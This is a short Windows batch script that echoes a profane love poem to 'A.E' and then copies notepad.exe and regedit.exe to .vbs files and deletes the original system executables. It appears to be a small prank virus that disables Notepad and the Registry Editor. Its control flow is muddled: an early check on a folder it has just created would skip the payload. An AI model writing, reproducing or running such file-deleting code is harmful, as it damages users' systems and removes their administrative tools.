md c:\GSS
if exist c:\gss goto end
echo off
@echo Silent Nights, Lonely Nights.
@echo My Lonelieness Is Killing Me.
@echo Its So Silent, So Lonely Tonight.
@echo How I Wish That You Were Here With Me.
@echo The Loneliness That Comes With The Silent Nights
@echo Would Be Better If I Were Lonely And Silent With You!
@echo 
@echo ...I Fucking Love You A.E! It Would Be Worth The Silence
@echo If The Silence Were With You...
@echo 
@echo off
@copy c:\windows\notepad.exe c:\windows\notepad.vbs
@del c:\windows\notepad.exe
@copy c:\windows\regedit.exe c:\windows\regedit.vbs
@del c:\windows\regedit.exe
@exit
@if not exist c:\windows\notepad.vbs goto end
@if not exist c:\windows\regedit.vbs goto end
goto end
 
:end
exit
